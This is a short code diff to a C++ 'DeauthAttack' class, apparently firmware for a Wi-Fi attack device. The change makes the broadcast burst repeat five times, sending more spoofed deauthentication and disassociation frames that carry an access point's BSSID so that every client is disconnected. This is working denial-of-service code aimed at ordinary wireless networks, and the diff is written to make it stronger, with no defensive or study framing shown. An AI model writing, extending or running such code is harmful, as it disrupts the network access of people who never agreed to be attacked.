@@ -89,10 +89,12 @@ DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFu
 void DeauthAttack::sendBroadcastBurst(const uint8_t* bssid) {
     uint8_t frame[26];
     volatile uint32_t ok = 0, fail = 0;
-    buildFrame(frame, BROADCAST, bssid, bssid, false);
-    sendFrame3x(frame, ok, fail);
-    buildFrame(frame, BROADCAST, bssid, bssid, true);
-    sendFrame3x(frame, ok, fail);
+    for (int r = 0; r < 5; r++) {
+        buildFrame(frame, BROADCAST, bssid, bssid, false);
+        sendFrame3x(frame, ok, fail);
+        buildFrame(frame, BROADCAST, bssid, bssid, true);
+        sendFrame3x(frame, ok, fail);
+    }
 }
 
 bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
